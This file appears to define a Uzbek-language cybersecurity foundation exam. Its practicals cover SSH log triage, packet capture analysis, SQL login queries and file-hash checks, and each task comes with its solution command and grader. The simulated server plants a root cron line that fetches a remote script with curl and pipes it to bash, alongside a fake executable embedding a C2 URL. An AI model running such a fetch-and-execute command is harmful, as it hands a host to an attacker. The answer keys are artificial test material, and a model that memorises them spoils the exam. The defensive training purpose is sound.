import type { Exam, ExamPractical } from '../examTypes';
import { parseBank } from '../../engine/exam';
import { sha256Hex } from '../../engine/terminal/text';
import { Capture, httpPost, httpResponse, at } from '../../engine/terminal/pcapBuild';
import { decodeCapture, dissect } from '../../engine/terminal/pcap';
import { modeAt } from '../labs/helpers';
import { column, expectRows, hasRows, inserts, lastResult, queryDb } from '../labs/sqlHelpers';
import { FOUNDATION_BANK } from './foundationBank';

/* ── practical 1: a Linux server ─────────────────────────────────────── */

const BRUTE = '198.51.100.37';
function authLog(): string {
  const lines: string[] = [];
  let s = 0;
  const t = () => {
    s += 9;
    return `Nov 19 02:${String(10 + Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
  };
  lines.push(`${t()} srv-app-01 sshd[1201]: Accepted publickey for deploy from 10.10.0.5 port 50112 ssh2`);
  const users = ['root', 'admin', 'root', 'test', 'root', 'oracle', 'admin', 'root', 'ubuntu', 'root', 'git', 'root', 'admin', 'root'];
  users.forEach((u, i) => lines.push(`${t()} srv-app-01 sshd[13${i}0]: Failed password for ${u} from ${BRUTE} port ${41000 + i * 7} ssh2`));
  for (let i = 0; i < 3; i++) lines.push(`${t()} srv-app-01 sshd[1500]: Failed password for jasur from 10.10.20.31 port ${52000 + i} ssh2`);
  lines.push(`${t()} srv-app-01 sshd[1501]: Accepted password for jasur from 10.10.20.31 port 52004 ssh2`);
  return lines.join('\n') + '\n';
}
const AUTH = authLog();
const BRUTE_FAILS = AUTH.split('\n').filter((l) => l.includes('Failed password') && l.includes(BRUTE)).length;

const linuxServer: ExamPractical = {
  id: 'f-linux-server',
  topic: 'linux',
  title: 'Linux server tekshiruvi',
  intro:
    "`srv-app-01` serveri tunda shubhali harakat qayd etdi. Siz administratorsiz. `/var/log/auth.log` — SSH jurnali, `/opt/app/` — ilova, `/etc/cron.d/` — rejalashtirilgan vazifalar. To'rtta savolga terminal bilan javob toping.",
  shell: () => ({
    host: 'srv-app-01',
    fs: {
      home: { talaba: {} },
      var: { log: { 'auth.log': AUTH } },
      opt: { app: { 'deploy.sh': { $file: '#!/bin/bash\ncd /opt/app && git pull && systemctl restart app\n', mode: 0o777, owner: 'root' }, 'app.py': { $file: 'print("app")\n', mode: 0o644, owner: 'root' } } },
      etc: { 'cron.d': { logrotate: '0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n', sysupdate: '*/15 * * * * root curl -s http://198.51.100.88/u.sh | bash\n', deploy: '30 2 * * * root /opt/app/deploy.sh\n' } },
      tmp: {},
    },
    cwd: '/home/talaba',
  }),
  tasks: [
    {
      id: 'count',
      text: `\`${BRUTE}\` manzilidan nechta muvaffaqiyatsiz SSH urinishi bo'lgan? Faqat sonni chiqaring.`,
      solution: [`grep "Failed password" /var/log/auth.log | grep ${BRUTE} | wc -l`],
      check: ({ output }) => output.trim() === String(BRUTE_FAILS),
    },
    {
      id: 'writable',
      text: "`/opt/app` ichidagi **hamma yoza oladigan** (boshqalar uchun w ruxsati bor) faylni toping.",
      solution: ['find /opt/app -perm -0002 -type f'],
      check: ({ output }) => output.trim() === '/opt/app/deploy.sh',
    },
    {
      id: 'chmod',
      text: "Bu skript cron orqali root nomidan ishlaydi. Ruxsatini xavfsiz qiling: egasi hamma narsa, guruh va boshqalar faqat o'qish va bajarish (755).",
      solution: ['sudo chmod 755 /opt/app/deploy.sh'],
      check: ({ state }) => modeAt(state, '/opt/app/deploy.sh') === 0o755,
    },
    {
      id: 'cron',
      text: "Cron vazifalaridan qaysi biri tashqi serverdan skript yuklab bajaradi? Uni ko'rsatadigan buyruqni ishlating (fayl nomi chiqishi kerak).",
      solution: ['grep -l curl /etc/cron.d/*'],
      check: ({ output }) => output.includes('/etc/cron.d/sysupdate') || (output.includes('sysupdate') && output.includes('198.51.100.88')),
    },
  ],
};

/* ── practical 2: a traffic capture ──────────────────────────────────── */

function capture(): string {
  const c = new Capture();
  c.dns(at(9, 0), '10.10.10.31', '10.10.0.2', 'portal.mybank.uz', ['192.0.2.44']);
  c.tls(at(9, 0, 1), '10.10.10.31', 50100, '192.0.2.44', 'portal.mybank.uz');
  c.dns(at(9, 2), '10.10.10.47', '10.10.0.2', 'update-check.example-cdn.net', ['203.0.113.45']);
  c.tls(at(9, 2, 1), '10.10.10.47', 50200, '203.0.113.45', 'update-check.example-cdn.net');
  [21, 22, 23, 80, 443, 3306, 8080].forEach((p, i) => c.probe(at(9, 4, i * 0.2), '198.51.100.23', 40000 + i, '10.10.30.11', p, p === 22 || p === 80));
  c.tcp(at(9, 6), '10.10.10.12', 51000, '10.10.30.11', 80, [{ c: httpPost('intranet.example.com', '/login', 'username=z.yusupova&password=Bahor2026'), s: httpResponse(302, 'Found', '') }]);
  return c.build();
}
const PCAP = capture();
const FR = dissect(decodeCapture(PCAP)!);
const SCANNED = new Set(FR.filter((f) => f.p.src === '198.51.100.23' && f.p.fl === 'S').map((f) => f.p.dp)).size;

const trafficCapture: ExamPractical = {
  id: 'f-traffic',
  topic: 'tarmoq',
  title: 'Trafik fayli tahlili',
  intro: "`~/trafik.pcap` — ofis tarmog'idan yozib olingan bir necha daqiqalik trafik. `tshark` yoki `tcpdump` bilan javob toping.",
  shell: () => ({ fs: { home: { talaba: { 'trafik.pcap': PCAP } }, tmp: {} } }),
  tasks: [
    {
      id: 'dns',
      text: '`update-check.example-cdn.net` domenini qaysi ichki IP so\'ragan? Shu IP chiqadigan buyruqni ishlating.',
      solution: ['tshark -r trafik.pcap -Y "dns.qry.name == update-check.example-cdn.net" -T fields -e ip.src'],
      check: ({ line, output }) => /tshark|tcpdump/.test(line) && output.includes('10.10.10.47'),
    },
    {
      id: 'scan',
      text: '`198.51.100.23` nechta turli portga SYN yuborgan? Faqat sonni chiqaring.',
      solution: ['tshark -r trafik.pcap -Y "ip.src == 198.51.100.23 && tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e tcp.dstport | sort -u | wc -l'],
      check: ({ output }) => output.trim() === String(SCANNED),
    },
    {
      id: 'cred',
      text: "Tarmoqda ochiq matnda parol yuborilgan. Qaysi foydalanuvchi nomi bilan? Shu nom ko'rinadigan buyruqni ishlating.",
      solution: ['tshark -r trafik.pcap -Y "http.request.method == POST" -T fields -e http.file_data'],
      check: ({ output }) => output.includes('z.yusupova'),
    },
  ],
};

/* ── practical 3: SQL over an application database ───────────────────── */

const DB = '/home/talaba/ilova.db';
const SQL_SCRIPT = [
  'CREATE TABLE users (id INTEGER PRIMARY KEY, ism TEXT, rol TEXT);',
  'CREATE TABLE logins (id INTEGER PRIMARY KEY, vaqt TEXT, ism TEXT, ip TEXT, natija TEXT);',
  inserts('users', ['id', 'ism', 'rol'], [[1, 'aziz', 'admin'], [2, 'dilnoza', 'user'], [3, 'nodira', 'user'], [4, 'jasur', 'user'], [5, 'sherzod', 'admin'], [6, 'kamola', 'user']]),
  inserts('logins', ['vaqt', 'ism', 'ip', 'natija'], [
    ...['aziz', 'dilnoza', 'nodira', 'jasur', 'kamola'].map((u, i) => [`2026-11-18 0${8 + (i % 2)}:1${i}:00`, u, `192.0.2.${10 + i}`, 'ok']),
    ...Array.from({ length: 9 }, (_, i) => [`2026-11-18 02:0${i}:30`, ['admin', 'aziz', 'test', 'nodira'][i % 4]!, '203.0.113.64', 'xato']),
    ['2026-11-18 02:09:41', 'nodira', '203.0.113.64', 'ok'],
    ['2026-11-18 03:00:00', 'jasur', '192.0.2.13', 'xato'],
  ]),
].join('\n');

const sqlPractical: ExamPractical = {
  id: 'f-sql',
  topic: 'dasturlash',
  title: 'Ilova bazasida SQL',
  intro: "`~/ilova.db` — SQLite bazasi: `users` (id, ism, rol) va `logins` (vaqt, ism, ip, natija: ok/xato). `sqlite3 ilova.db \"SO'ROV;\"` bilan ishlang.",
  runtimes: ['sql'],
  shell: () => ({ fs: { home: { talaba: {} }, tmp: {} }, sqlite: { [DB]: SQL_SCRIPT } }),
  tasks: [
    {
      id: 'admins',
      text: "Administratorlar (`rol` = admin) kim? Ismlarini chiqaring.",
      solution: ["sqlite3 ilova.db \"SELECT ism FROM users WHERE rol = 'admin';\""],
      check: (c) => [...(column(lastResult(c), 'ism') ?? [])].sort().join() === 'aziz,sherzod',
    },
    {
      id: 'top',
      text: "Eng ko'p muvaffaqiyatsiz kirish (`natija` = xato) qaysi IP dan? IP va urinishlar sonini chiqaring.",
      solution: ["sqlite3 ilova.db \"SELECT ip, COUNT(*) FROM logins WHERE natija = 'xato' GROUP BY ip ORDER BY 2 DESC LIMIT 1;\""],
      check: (c) => hasRows(lastResult(c), expectRows(c.state, DB, "SELECT ip, COUNT(*) FROM logins WHERE natija = 'xato' GROUP BY ip ORDER BY 2 DESC LIMIT 1")) && lastResult(c)!.rows.length === 1,
    },
    {
      id: 'winner',
      text: 'Shu IP dan muvaffaqiyatli kirgan foydalanuvchini toping.',
      solution: ["sqlite3 ilova.db \"SELECT ism FROM logins WHERE ip = '203.0.113.64' AND natija = 'ok';\""],
      check: (c) => (column(lastResult(c), 'ism') ?? []).join() === 'nodira',
    },
    {
      id: 'block',
      text: "Shu hisobni bloklang: uning `rol` qiymatini `bloklangan` qiling (faqat uning!).",
      solution: ["sqlite3 ilova.db \"UPDATE users SET rol = 'bloklangan' WHERE ism = 'nodira';\""],
      check: (c) => {
        const r = queryDb(c.state, DB, "SELECT ism FROM users WHERE rol = 'bloklangan'");
        return r.rows.length === 1 && r.rows[0]![0] === 'nodira';
      },
    },
  ],
};

/* ── practical 4: encodings, hashes, file types ──────────────────────── */

const NOTE_B64 = 'WmF4aXJhIHNlcnZlcmk6IGJhY2t1cC5xYXlkbm9tYS5leGFtcGxlLmNvbSwgaGlzb2I6IHN2Yy1iYWNrdXA=';
const FILES: Record<string, string> = {
  'agent.exe': 'MZ\u0090\u0000\u0003\u0000\u0000\u0000This program cannot be run in DOS mode.\u0000http://203.0.113.45/gate\u0000',
  'readme.txt': "O'rnatish yo'riqnomasi\n",
  'config.json': '{"server": "app.qaydnoma.example.com"}\n',
};
const LIST = `${sha256Hex(FILES['agent.exe']!.replace('203.0.113.45', '192.0.2.10'))}  agent.exe\n${sha256Hex(FILES['readme.txt']!)}  readme.txt\n${sha256Hex(FILES['config.json']!)}  config.json\n`;

const encodingPractical: ExamPractical = {
  id: 'f-encoding',
  topic: 'kompyuter',
  title: 'Kodlash, xesh va fayl turlari',
  intro: "`~/yuklamalar/` — xodim kompyuteridan olingan fayllar va rasmiy saytdagi `SHA256SUMS` ro'yxati. `~/eslatma.txt` da Base64 bilan \"yashirilgan\" matn bor.",
  shell: () => ({ fs: { home: { talaba: { 'eslatma.txt': NOTE_B64 + '\n', yuklamalar: { ...FILES, 'invoice.pdf': FILES['agent.exe']!, SHA256SUMS: LIST } } }, tmp: {} } }),
  tasks: [
    {
      id: 'b64',
      text: '`eslatma.txt` dagi Base64 matnni oching.',
      solution: ['base64 -d eslatma.txt'],
      check: ({ output }) => output.includes('svc-backup'),
    },
    {
      id: 'sums',
      text: "`yuklamalar/` dagi fayllarni `SHA256SUMS` bilan tekshiring. Qaysi fayl o'zgartirilgan?",
      solution: ['cd yuklamalar && sha256sum -c SHA256SUMS'],
      check: ({ output }) => /agent\.exe: FAILED/.test(output),
    },
    {
      id: 'type',
      text: '`invoice.pdf` haqiqatan PDF mi? Turini aniqlang.',
      solution: ['file /home/talaba/yuklamalar/invoice.pdf'],
      check: ({ output }) => output.includes('PE32+ executable'),
    },
    {
      id: 'url',
      text: "`agent.exe` ichida qanday URL bor? Faylni ishga tushirmasdan toping.",
      solution: ['strings /home/talaba/yuklamalar/agent.exe | grep http'],
      check: ({ output }) => output.includes('http://203.0.113.45/gate'),
    },
  ],
};

export const FOUNDATION_EXAM: Exam = {
  id: 'foundation',
  title: 'Poydevor imtihoni',
  summary: "Kompyuter, tarmoq, Linux, dasturlash (Python, SQL, Git) va xavfsizlik asoslari — vaziyatli savollar va ikki amaliy topshiriq.",
  topics: [
    { id: 'kompyuter', title: 'Kompyuter asoslari', stages: ['s0-kirish', 's1-kompyuter'] },
    { id: 'tarmoq', title: 'Tarmoq', stages: ['s2-tarmoq'] },
    { id: 'linux', title: 'Linux', stages: ['s3-linux'] },
    { id: 'dasturlash', title: 'Dasturlash', stages: ['s4-dasturlash'] },
    { id: 'xavfsizlik', title: 'Xavfsizlik asoslari', stages: ['s5-xavfsizlik'] },
  ],
  questions: parseBank('foundation', FOUNDATION_BANK),
  practicals: [linuxServer, trafficCapture, sqlPractical, encodingPractical],
};

